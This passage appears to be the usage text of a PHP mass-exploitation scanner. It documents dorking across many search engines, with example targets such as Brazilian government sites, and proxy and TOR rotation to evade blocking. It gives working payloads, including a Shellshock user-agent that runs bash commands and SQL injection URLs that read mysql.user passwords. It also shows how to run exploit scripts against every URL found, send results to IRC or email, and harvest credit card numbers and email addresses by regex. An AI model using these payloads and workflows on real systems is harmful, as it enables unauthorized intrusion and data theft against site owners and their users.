     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
     {$_SESSION["c1"]}14{$_SESSION["c0"]}  - {$_SESSION["c2"]}BAIDU BR
     {$_SESSION["c1"]}15{$_SESSION["c0"]}  - {$_SESSION["c2"]}YANDEX
     {$_SESSION["c1"]}16{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZOO
     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBOT
     {$_SESSION["c1"]}18{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZHONGSOU
     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
     {$_SESSION["c1"]}23{$_SESSION["c0"]}  - {$_SESSION["c2"]}BOOROW
     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
     ----------------------------------------
     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
   
 {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}

 {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}

 {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
         

 {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
 
 {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
     [options]:
     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$_SESSION["c11"]}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
     - Using multiples dorks:
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
     
 {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
             
 {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
     
 {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
   
 {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7

 {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'

 {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
  
 {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
 
 {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
     
 {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
     
 {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.

 {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
 
 {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.

 {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.

 {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
     
 {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.

 {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
     
 {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
     
 {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
      
 {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'

 {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'

 {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'

 {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
          
 {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
  
 {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10

 {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=

 {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
 
 {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br

 {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
 
 {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
     
 {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt

 {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
    [!] Observation:
   
    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
       
    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
        
    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
        
    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
        
    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
   
    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}

 {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
              
 {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    All Major Credit Cards:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
    
    IP Addresses:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
    
    EMAIL:   
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
    

 {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    EMAIL:   
    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
 

    [!] Small commands manager:
    
 {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
         
 {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22

 {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
         
 {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
     the target host within the subprocess
     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}


 {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}



    [!] Modifying values used within script parameters:
    
